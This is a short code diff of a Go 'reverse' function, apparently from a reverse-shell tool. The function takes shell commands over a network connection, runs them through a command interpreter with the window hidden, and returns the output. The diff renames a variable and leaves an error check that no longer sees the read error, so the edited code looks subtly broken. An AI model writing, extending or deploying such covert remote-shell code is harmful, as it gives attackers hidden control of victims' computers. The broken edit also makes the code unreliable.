@@ -45,14 +45,14 @@ func reverse(host string,term string) {
 	r := bufio.NewReader(c)
 	for {
 		c.Write([]byte("$ "))
-		order, err := r.ReadString('\n')
+		cmd, _ := r.ReadString('\n')
 		if nil != err {
 			c.Close()
 			fmt.Println("Closed... :(")
 			return
 		}
-		order = strings.TrimSuffix(order,"\n")		//Remove the "\n"
-		args := strings.Split(order, " ")
+		cmd = strings.TrimSuffix(cmd,"\n")		//Remove the "\n"
+		args := strings.Split(cmd, " ")
 		usr, _:= user.Current()								//Get the home dir
 		switch args[0] {
 		case "cd":
@@ -64,7 +64,7 @@ func reverse(host string,term string) {
 		case "exit":
 			os.Exit(0)
 		default:
-			cmd := exec.Command(term, "/C", order)
+			cmd := exec.Command(term, "/C", cmd)
 			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}	//Hide window
 			out, _ := cmd.CombinedOutput()
 			c.Write(out)
